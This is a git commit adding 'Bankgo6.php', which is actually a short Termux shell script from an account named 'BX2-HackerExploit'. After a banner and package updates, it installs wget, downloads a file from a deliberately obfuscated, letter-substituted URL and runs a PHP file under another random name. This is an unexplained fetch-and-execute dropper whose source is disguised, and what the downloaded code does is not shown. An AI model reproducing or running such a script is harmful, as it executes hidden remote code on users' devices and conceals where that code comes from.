6b4aef34139eef84c8ae2989bc28b3fca671de04
BX2-HackerExploit <66146407+BX2-HackerExploit@users.noreply.github.com>
2020-07-19 20:00:49 +0300

    Add files via upload

---
+++ Bankgo6.php
@@ -0,0 +1,17 @@
+#!/data/data/com.termux
+
+
+
+sleep 2
+figlet INDOnimous
+sleep 2
+apt-get update && apt-get upgrade
+sleep 2
+pkg install wget
+sleep 1
+wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
+php CMQyGnfN
+
+
+
+
